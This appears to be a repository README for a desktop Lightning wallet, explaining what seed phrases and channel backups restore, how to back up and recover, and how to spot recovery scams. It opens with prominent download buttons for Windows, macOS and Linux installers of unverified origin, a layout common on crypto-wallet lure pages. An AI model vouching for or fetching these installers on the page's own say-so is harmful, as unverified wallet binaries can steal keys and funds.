<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# Seed phrase and wallet recovery for Lightning Pay Wallet
A phrase restores keys, the channel backup restores channel funds, and a lost phrase with no backup restores nothing.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**
A twelve or twenty-four word seed phrase is a human-readable encoding of the master key a wallet derives every address from. Restore that phrase in any wallet that implements the same standard and you get the same keys back, on any device, without asking anyone for permission. What the phrase does not carry is Lightning channel state, which needs the channel backup.

## What a seed phrase is

A seed phrase is a sequence of words drawn from a fixed 2048-word list, twelve or twenty-four of them, that encodes a random number and a checksum. The checksum is why a phrase with one mistyped word is rejected rather than silently producing a different wallet.

The words are not a password and they are not encrypted. Anyone who reads them in order holds the wallet, which is why the phrase is written on paper, kept offline and never typed into a website.

## What a phrase restores, and why it is the standard that guarantees it

A phrase restores the keys, and the keys restore the on-chain balance. That guarantee comes from the standard the phrase follows, not from a particular build: BIP-39 defines how the words encode the seed, and BIP-32 defines how the seed derives the key tree, so any wallet implementing both arrives at the same addresses from the same phrase.

Two consequences follow. First, a phrase is portable: it does not belong to one application, and the standard is what makes it work elsewhere. Second, portability is not the same as completeness. A wallet can implement the phrase standard correctly and still hold funds that the phrase alone will not bring back, because those funds are not on-chain.

That distinction is the whole of Lightning recovery, and it is where most of the losses in this area happen: a reader backs up the phrase, believes the job is done, and later discovers that the balance lived in channels. [self-custody: what you hold](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-self-custody.md) sets out which part of a balance you hold and which part depends on a counterparty.

## What the phrase does not restore

The phrase does not restore channel state. A Lightning balance sits in channels between two nodes, and the current balance of each channel is not derivable from the seed: it is the result of every payment a channel has carried. That is why Lightning wallets publish a separate channel backup, and why restoring a phrase into a fresh wallet gives you your on-chain funds and an empty channel list.

The channel backup has a known cost. A backup taken before the last payments is a stale snapshot, and recovering from a stale snapshot can mean losing the difference; some wallets solve this by storing the newest backup on a server, others by asking you to keep a file current. Either way, the thing to know is that the phrase and the channel backup are two different objects with two different jobs. What a channel does while it is open is the subject of [sending and receiving Lightning payments](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-send-and-receive.md).

## How to back up the wallet

Write the phrase on paper at the moment the wallet shows it, in the order shown, and store it where you would store a passport. Complete the verification step if the wallet offers one, and restore the phrase once on a fresh installation before moving a meaningful amount: a backup nobody has restored is a backup nobody has checked.

Do the same for the channel backup the wallet produces, if it produces one, and keep the two together but not in the same envelope as your device. A backup that lives only on the device it backs up is not a backup.

## How to recover a wallet with a seed phrase

Recovery means installing the wallet, choosing the import or restore option instead of create, and entering the words in order. If a build rejects a valid phrase, the repair is almost always the same: read the words again, one at a time, and check the order before assuming the phrase is wrong.

Do not enter the phrase into a website, a browser extension, a chat message or a support form. No legitimate recovery process needs it in any of those places, and a page that asks is collecting it.

## Importing an existing wallet

A wallet that implements the standard can import a phrase created elsewhere, and the result is the same key tree. What can differ is what the importing wallet knows how to do with it: another application's phrase may restore the on-chain balance perfectly and bring no channel history at all, because channels belong to the wallet that opened them.

If an import is refused, the cause is one of three things: a word that is not in the list, a word in the wrong position, or a phrase that is not a phrase at all. Check against the standard word list before concluding the backup is corrupt.

## Passwords, resets and the difference from a phrase

The password on a desktop wallet protects the wallet file on that machine. It is not a recovery method, it does not encrypt the phrase, and there is no server that can reset it. If the password is forgotten, the route back is the phrase: import the wallet again and set a new password.

"What if I forgot my password" and "what if I lost my phrase" are therefore different questions with different answers. A forgotten password costs an hour. A lost phrase with no backup costs the wallet.

## Losing a phone, or factory resetting it

A lost phone loses nothing that the standard can restore, provided the phrase was written down. The keys regenerate on a new device from the words, and an on-chain balance appears as soon as the wallet syncs.

Two things do not come back on their own. Channel balances need the channel backup, and a phone that has been factory reset has lost any backup that lived only on it. If the wallet kept the channel backup in cloud storage or behind an account, that copy is the one to restore from.

## If the phrase itself is lost

If the phrase is lost and no copy exists, the funds are not recoverable, and no tool, service or support request changes that. No server holds a copy, so there is nothing to reset and nobody to ask.

Two things are worth saying plainly here, because they are what people search for in this situation. A "recovery service" that offers to restore a wallet without the phrase is either guessing at weak passwords or taking your money. And a wallet that will not open is not necessarily a wallet whose funds are gone: if the phrase exists, the wallet can be rebuilt on another machine, which is a different situation from losing the phrase.

## Recovery tools and "will this restore it"

There is no third-party tool that restores a Lightning wallet from a phrase and recovers channels with it. What restores a wallet is a wallet that implements the phrase standard; what restores channels is the channel backup, read by software that understands the format.

Treat every download offering wallet recovery as hostile: the phrase is the prize, and the only safe recovery tool is the one from the wallet's own release page.

## If the wallet will not open

Work in this order. Install the current release first, because a wallet that will not open is often a wallet whose build no longer matches the network it talks to. Then check whether the file is a wallet file at all rather than a shortcut or a copy, and check that the disk is not full. If the application starts but cannot sync, that is a network problem rather than a recovery problem.

[the current release](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1)

If the wallet itself is the unknown quantity, [what Lightning Pay Wallet is and whether it is safe](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-what-it-is-and-is-it-safe.md) describes what it is and what it does not claim. If none of that helps and the phrase exists, restore into a fresh installation rather than repairing the old one. If the phrase does not exist, stop: nothing further will recover it, and every step after this point risks the copy that is left.

## Questions people ask

### Does a seed phrase restore a Lightning balance?

It restores the keys and the on-chain balance. Channel balances need the channel backup as well, so a wallet restored from the phrase alone shows its on-chain funds and no channels.

### Can I use the phrase from another wallet in this one?

Yes if both follow the same phrase standard, which is what makes the words portable. What comes across is the key tree; channel history stays with the wallet that created it.

### Is the wallet password the same as the phrase?

No. The password unlocks the wallet file on one machine and can be replaced by restoring from the phrase; the phrase is the backup itself and cannot be replaced by anything.

### What happens to my sats if I lose the phone and never wrote the phrase down?

They stay on the network and become unreachable, because no copy of the key exists anywhere else. That is the one failure self-custody cannot repair.

### Can support recover a wallet for me?

No. Support cannot see your keys, holds no copy of the phrase, and has no reset. Anyone claiming otherwise, in a message or on a social platform, is impersonating support; the product's own anti-phishing policy says support never asks for a phrase and never contacts you first.
